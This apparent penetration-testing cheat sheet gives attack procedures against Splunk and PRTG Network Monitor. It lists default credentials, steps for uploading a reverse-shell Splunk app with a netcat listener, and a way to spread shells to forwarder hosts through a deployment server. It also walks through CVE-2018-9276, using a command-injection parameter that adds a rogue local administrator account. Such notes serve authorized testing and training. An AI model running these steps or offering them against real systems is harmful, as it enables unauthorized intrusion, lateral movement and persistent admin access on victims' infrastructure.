# Infrastructure and Network Monitoring Tools

In this section, we will discuss the following technologies:
- Splunk
- PRTG Network Monitor

## Splunk

The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme

The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc.

**Code Execution**
````
https://github.com/0xjpuff/reverse_shell_splunk

$ tree splunk_shell/
splunk_shell/
├── bin
└── default
````
If it is Windows, change the IP in run.ps1; if it is Linux, change the IP in rev.py.
````
$ tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
$ mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
````
````
1 - https://<domain>:8000/en-US/manager/search/apps/local
2 - Install app from file
3 - nc -lvp <port>
4 - Upload spl file
````
If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the $SPLUNK_HOME/etc/deployment-apps directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

## PRTG Network Monitor

PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.

**Discovery/Footprinting/Enumeration**
````
$ sudo nmap -sV -p- --open -T4 <IP>
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
````
Default Creds -> prtgadmin:prtgadmin

PRTG version 17.3.33.2830 is likely vulnerable to CVE-2018-9276 which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39.
````
$ curl -s http://<IP>:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
````

**Exploitation CVE-2018-9276**
````
1 - Setup > Account Settings > Notifications
2 - Add new notification
3 - Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM
4 - Under Program File, select Demo exe notification - outfile.ps1 from the drop-down
5 - In the parameter field, enter a command (Example: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add)
6 - Save
7 - Click the Test button to run our notification and execute the command
````
